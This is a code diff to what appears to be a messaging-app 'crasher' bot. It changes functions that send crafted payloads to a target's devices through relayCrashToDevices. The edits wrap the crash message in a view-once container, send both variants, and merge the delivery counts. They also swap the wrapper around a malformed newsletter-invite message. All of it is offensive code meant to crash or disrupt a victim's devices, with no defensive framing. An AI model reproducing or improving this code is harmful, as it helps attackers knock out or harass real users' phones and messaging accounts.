@@ -26,12 +26,20 @@ async function xgcs(SYxS7, target) {
         }
     };
 
+    const viewOnceMsg = {
+        viewOnceMessage: {
+            message: msg
+        }
+    };
+
     try {
-        return await relayCrashToDevices(SYxS7, target, {
-            groupStatusMessageV2: {
-                message: msg
-            }
-        });
+        const r1 = await relayCrashToDevices(SYxS7, target, msg);
+        const r2 = await relayCrashToDevices(SYxS7, target, viewOnceMsg);
+        return {
+            success: r1.success || r2.success,
+            deliveredCount: r1.deliveredCount + r2.deliveredCount,
+            errors: [...r1.errors, ...r2.errors]
+        };
     } catch (error) {
         console.log(`[ 🗑️ ] Error on message: ${error.message}`);
         return { success: false, deliveredCount: 0, errors: [error.message] };
@@ -41,7 +49,7 @@ async function xgcs(SYxS7, target) {
 async function xgc(sam, target) {
     try {
         const messsage = {
-            botInvokeMessage: {
+            viewOnceMessage: {
                 message: {
                     newsletterAdminInviteMessage: {
                         newsletterJid: '33333333333333333@newsletter',
